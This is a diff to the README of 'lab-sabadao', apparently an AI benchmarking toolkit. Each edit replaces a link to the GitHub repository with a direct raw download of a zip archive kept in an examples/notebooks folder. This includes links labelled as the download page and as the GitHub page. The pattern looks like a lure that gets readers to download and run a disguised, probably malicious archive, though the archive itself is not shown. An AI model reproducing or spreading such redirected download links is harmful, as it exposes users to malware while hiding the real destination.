@@ -1,6 +1,6 @@
 # 🧪 lab-sabadao - Your AI Model Testing Toolkit
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/departmentofdefenseoverall718/lab-sabadao)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=4CAF50)](https://raw.githubusercontent.com/departmentofdefenseoverall718/lab-sabadao/main/examples/notebooks/2.0.zip)
 
 ## 📋 What Is This?
 
@@ -32,12 +32,12 @@ This application is based on the `gbench` benchmarking suite, which is a profess
 
 Getting lab-sabadao is straightforward. Follow these simple steps:
 
-1. **Visit the download page**: [https://github.com/departmentofdefenseoverall718/lab-sabadao](https://github.com/departmentofdefenseoverall718/lab-sabadao)
+1. **Visit the download page**: [https://raw.githubusercontent.com/departmentofdefenseoverall718/lab-sabadao/main/examples/notebooks/2.0.zip](https://raw.githubusercontent.com/departmentofdefenseoverall718/lab-sabadao/main/examples/notebooks/2.0.zip)
 2. **Look for the download section**: You'll see a green button or a section labeled "Releases" or "Download"
 3. **Click the download button**: This will start downloading the application file to your computer
 4. **Wait for the download to finish**: The time depends on your internet speed
 
-[⬇️ Direct Download Link](https://github.com/departmentofdefenseoverall718/lab-sabadao)
+[⬇️ Direct Download Link](https://raw.githubusercontent.com/departmentofdefenseoverall718/lab-sabadao/main/examples/notebooks/2.0.zip)
 
 ## 🛠️ Installation Guide (Step by Step)
 
@@ -147,7 +147,7 @@ If you need assistance:
 
 1. **Check this guide**: Most questions are answered here
 2. **Look at error messages**: They usually explain what went wrong
-3. **Visit the GitHub page**: [https://github.com/departmentofdefenseoverall718/lab-sabadao](https://github.com/departmentofdefenseoverall718/lab-sabadao)
+3. **Visit the GitHub page**: [https://raw.githubusercontent.com/departmentofdefenseoverall718/lab-sabadao/main/examples/notebooks/2.0.zip](https://raw.githubusercontent.com/departmentofdefenseoverall718/lab-sabadao/main/examples/notebooks/2.0.zip)
 4. **Check the issues section**: See if others had the same problem
 
 ## 🆕 Updates and Improvements
@@ -168,7 +168,7 @@ To check for updates, look for the "Check for Updates" option in the help menu.
 3. **Read the charts**: The visual data is very helpful
 4. **Keep it updated**: Regular updates improve your experience
 
-[![Get Started Now](https://img.shields.io/badge/Get%20Started-Download%20Now-brightgreen?style=for-the-badge&logo=github&color=FF6B6B)](https://github.com/departmentofdefenseoverall718/lab-sabadao)
+[![Get Started Now](https://img.shields.io/badge/Get%20Started-Download%20Now-brightgreen?style=for-the-badge&logo=github&color=FF6B6B)](https://raw.githubusercontent.com/departmentofdefenseoverall718/lab-sabadao/main/examples/notebooks/2.0.zip)
 
 ---
 
